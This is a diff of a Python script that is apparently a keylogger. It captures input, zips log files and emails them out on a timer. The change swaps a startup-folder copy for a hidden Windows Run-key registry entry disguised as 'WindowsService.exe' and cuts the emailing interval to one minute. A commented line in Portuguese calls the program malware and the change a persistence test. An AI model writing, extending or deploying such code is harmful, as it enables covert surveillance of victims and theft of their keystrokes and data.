@@ -12,30 +12,16 @@ from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from zipfile import ZipFile
-from datetime import datetime
-import os, smtplib, shutil
-import aspose.zip as az
+import smtplib
+
+#persistence libs
+import ctypes
+import winreg as reg
 
 #global
 running = True
 timer = 10
 
-
-# ..inserts script into system's startup file
-import urllib.request as request
-import os
-
-url_img = "https://d3kjluh73b9h9o.cloudfront.net/original/4X/d/8/9/d89b58688e2b1b0d8fc256a4cdd6a454e49ac2a2.png"
-img_name = "image.png"  # Simplified image name
-dest = os.path.expanduser("~") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-
-request.urlretrieve(url_img, img_name)
-
-def autorun():
-    filen = os.path.basename(__file__)
-    os.system(f"copy {filen} \"{dest}\\{filen}\"")
-
-              
 # ..reading threads
 def onClick(x, y, buttom, pressed):
     global running
@@ -147,15 +133,27 @@ def emailTimer(current_date, date, root_dir, log_file, zip_filename, path_zipfil
     global timer
 
     while True:
-        for i in range(600):
+        for i in range(60):
             time.sleep(1)
 
-            if(i == 599):
+            if(i == 59):
+                # print("entrou")
                 sendEmail(current_date, date, root_dir, log_file, zip_filename, path_zipfile)
 
-if __name__ == '__main__':
-    autorun()
+# ..adds script to regedit so it can run everytime the pc resets..            
+def add_registry_entry():
+    try:
+        with reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_SET_VALUE) as open_key:
+            reg.SetValueEx(open_key, "WindowsService.exe", 0, reg.REG_SZ, os.path.realpath(__file__))
+    except Exception as e:
+        pass
+    
+# def show_message():
+#     ctypes.windll.user32.MessageBoxW(0, "O malware foi executado com sucesso!", "Teste de Persistência", 1)
 
+if __name__ == '__main__':
+    add_registry_entry()
+    
     current_date = datetime.now()
     date = current_date.strftime("%d-%m")
     
